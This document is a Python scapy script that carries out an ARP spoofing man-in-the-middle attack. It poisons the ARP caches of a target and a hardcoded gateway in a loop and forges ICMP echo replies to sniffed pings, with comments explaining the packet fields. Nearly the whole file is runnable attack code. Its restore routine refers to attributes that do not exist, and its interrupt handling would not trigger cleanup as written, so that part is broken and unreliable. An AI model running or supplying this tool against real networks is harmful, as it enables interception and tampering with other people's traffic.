#!/usr/bin/env python3

from scapy.layers.inet import IP
import scapy.all as scapy
import os
import sys                  #sys.argv
import time
import threading


"""------------------returns the MAC address of a device given its IP address"""
def get_mac(ip):
    arp_request = scapy.ARP(pdst = ip)                  # create an ARP packet
    broadcast = scapy.Ether(dst = "ff:ff:ff:ff:ff:ff")  # create an Ethernet packet
    arp_request_broadcast = broadcast / arp_request     # combine the packets*
    answered_list = scapy.srp(arp_request_broadcast,    # send and receive a list
                                timeout = 5, 
                                verbose = False)[0]
    return answered_list[0][1].hwsrc                    # return the MAC address of the first answered packet


"""---------------------------sends a spoofed ARP packet to the target device"""
def spoof(target_ip, spoof_ip):                         # see down explanation arguments
    packet = scapy.Ether(dst=get_mac(target_ip)) / scapy.ARP(op = 2, 
                            pdst = target_ip, 
                            hwdst = get_mac(target_ip),
                            psrc = spoof_ip)
    scapy.sendp(packet, verbose = False)
    time.sleep(1)                                       # pause for 1sec before sending more packet
	
 
"""sends continuously sends spoofed ARP packets to the target and the gateway"""
def arp_spoof():
    sent_packets_count = 0                              # init to 0 the count of sent packets
    while True:                                         
        spoof(target_ip, gateway_ip)                    # send a spoofed packet
        spoof(gateway_ip, target_ip)                    # send a spoofed packet
        sent_packets_count += 2    
        print("\rPackets Sent "+str(sent_packets_count), end="")

"""--------------------------------------sends an ICMP response to the source"""
def send_icmp_response(packet):                         # create the ICMP response packet
    resp = scapy.IP(dst=packet[IP].src,                 # **create IP packet and ICMP packet  and combine 
                    src=packet[IP].dst)/scapy.ICMP(type='echo-reply', 
                    id=packet[scapy.ICMP].id, 
                    seq=packet[scapy.ICMP].seq)/packet[scapy.ICMP].payload
    scapy.send(resp , verbose = False)       

"""--------------------check if the packet is an ICMP packet and ICMP request"""
def sniff_icmp(packet):
	if scapy.ICMP in packet and packet[scapy.ICMP].type == 8:
		send_icmp_response(packet)                      # send an ICMP response

"""-------------------------------capture packets with the filter set to icmp"""
def packet_sniffer():                               
	scapy.sniff(filter = "icmp", prn = sniff_icmp)

"""-------------------------------------------------------------------restore"""
def restore(target_ip, attacker_ip):
	destination_mac = get_mac(scapy.destination_ip)
	source_mac = get_mac(scapy.source_ip)
	packet = scapy.ARP(op = 2, pdst = scapy.destination_ip,
                       hwdst = destination_mac, 
                       psrc = scapy.source_ip,
                       hwsrc = source_mac)
	scapy.send(packet, verbose = False)


"""----------------------------------------------------------------------main"""

if len(sys.argv) < 2:
    print("Usage: ./arp_spoofing.py [target_ip]")
    sys.exit()   
target_ip = sys.argv[1]
gateway_ip = "192.168.0.50"
target_mac = get_mac(target_ip)
gateway_mac = get_mac(gateway_ip)
attacker_ip = "192.168.0.198"
print("gateway\t", gateway_mac,"|", gateway_ip)
print("target\t", target_mac,"|", target_ip)

"""-------------------------------------------------Start the spoofing attack""" 

try:
    thread1 = threading.Thread(target=arp_spoof)
    thread2 = threading.Thread(target=packet_sniffer)
    thread1.start()
    thread2.start()
    time.sleep(2)
    """-----------------------------------------------------restore when done"""
except KeyboardInterrupt:
    print("\nCtrl + C pressed.............Exiting")
    restore(gateway_ip, target_ip)
    restore(target_ip, gateway_ip)
    print("[+] Arp Spoof Stopped")



    """
    arugments 
    scapy.ARP(op = 2,                   # operation - 2 indicates a response.
            pdst = target_ip,           # pdst - IP destination
            hwdst = get_mac(target_ip), # hardware destination - mac address
                psrc = spoof_ip)        # psrc -IP source - P address that the ARP packet should appear to come from.
    """
    
    """
    *   The Ethernet frame is responsible for delivering the ARP packet 
        and sent over the network and received by the target device.
        
    **  combine the ICMP and IP packet , IP packet contain the ICMP packet
        the IP packet has the dest and source addresses
        the ICMP packet has the data to be sent
        
        the Ethernet frame is the box with MAC address
        IP packet contain the IP address
        ICMP packet contain the data
        
    """